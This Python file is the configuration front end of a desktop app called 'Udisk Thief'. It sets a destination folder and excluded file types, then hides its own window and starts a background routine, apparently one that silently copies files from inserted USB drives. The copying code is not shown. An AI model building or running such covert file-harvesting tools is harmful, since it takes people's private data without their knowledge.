"""
aaaaa
"""

import toga
from toga.style import Pack
from toga.style.pack import COLUMN, ROW
import psutil
import shutil
import os
from configparser import ConfigParser
from udiskthief.process import processUdisk
import threading

def setConfig(dest=r"D:\I",Uncopied=['*.iso','*.asf'],processfiles=True):
    '''
    Sets the configuration for the program.
    @param dest: The destination folder for the copied files.
    @param Uncopied: A list of file extensions that should not be copied.
    @param processfiles: A boolean value indicating whether to process the copied files or not.
    @return: None
    '''
    global DEST,uncopied,doProcessFiles
    DEST=dest
    uncopied=Uncopied
    doProcessFiles=processfiles

    config=ConfigParser()
    config['DEFAULT']={'destination':DEST,'uncopied':','.join(uncopied),'processfiles':str(doProcessFiles)}
    with open('config.ini','w') as configfile:
        config.write(configfile)

DEST=''
uncopied=[]
doProcessFiles=True

def getConfig():
    try:
        global DEST,uncopied,doProcessFiles
        config=ConfigParser()
        config.read('config.ini')
        DEST=config['DEFAULT']['destination']
        uncopied=config['DEFAULT']['uncopied'].split(',')
        doProcessFiles=config.getboolean('DEFAULT','processfiles')
    except:
        setConfig()
        getConfig()




class Udiskthief(toga.App):
    global DEST,uncopied,doProcessFiles
    getConfig()
    async def setDest(self,widget):
        global DEST
        dest= await self.main_window.dialog(toga.SelectFolderDialog(title='选择复制目的地'))
        if dest:
            DEST=dest
            self.destNotion.value=dest
            setConfig(DEST,uncopied,doProcessFiles)
    def configDone(self,widget):
        global DEST,uncopied,doProcessFiles
        uncopied=self.uncopiedText.value.split('\n')
        setConfig(DEST,uncopied,doProcessFiles)
        self.main_window.visible=False
        threading.Thread(target=processUdisk).start()
        
    def startup(self):
        """Construct and show the Toga application.

        Usually, you would add your application to a main content box.
        We then create a main window (with a name matching the app), and
        show the main window.
        """
        main_box = toga.Box(style=Pack(direction=COLUMN,padding=10))



        destLabel=toga.Label('复制到目录',style=Pack(padding_left=5,padding_right=5))
        destBox=toga.Box(style=Pack(direction=ROW,padding=1,width=300))
        self.destNotion = toga.TextInput(style=Pack(flex=1))
        self.destNotion.value=DEST
        destTweaker=toga.Button('修改',on_press=self.setDest,style=Pack(padding_left=5,padding_right=5))
        destBox.add(destLabel)
        destBox.add(self.destNotion)
        destBox.add(destTweaker)

        uncopiedBox=toga.Box(style=Pack(direction=ROW,padding=1,width=300))
        uncopiedLabel=toga.Label('不复制的文件类型',style=Pack(padding_left=5,padding_right=5))
        self.uncopiedText=toga.MultilineTextInput(style=Pack(flex=1))
        self.uncopiedText.value='\n'.join(uncopied)
        uncopiedBox.add(uncopiedLabel)
        uncopiedBox.add(self.uncopiedText)

        doProcessFilesSwitch=toga.Switch('复制的文件合并到一个文件夹',value=doProcessFiles)

        main_box.add(destBox)
        main_box.add(uncopiedBox)
        main_box.add(doProcessFilesSwitch)
        
        ConfigButton=toga.Button('完成配置',on_press=self.configDone,style=Pack(padding_left=5,padding_right=5))
        main_box.add(ConfigButton)

        self.main_window = toga.MainWindow(title=self.formal_name)
        self.main_window.content = main_box
        self.main_window.title="Udisk Thief 配置"
        self.main_window.size=(300,250)
        self.main_window.show()


def main():
    return Udiskthief()
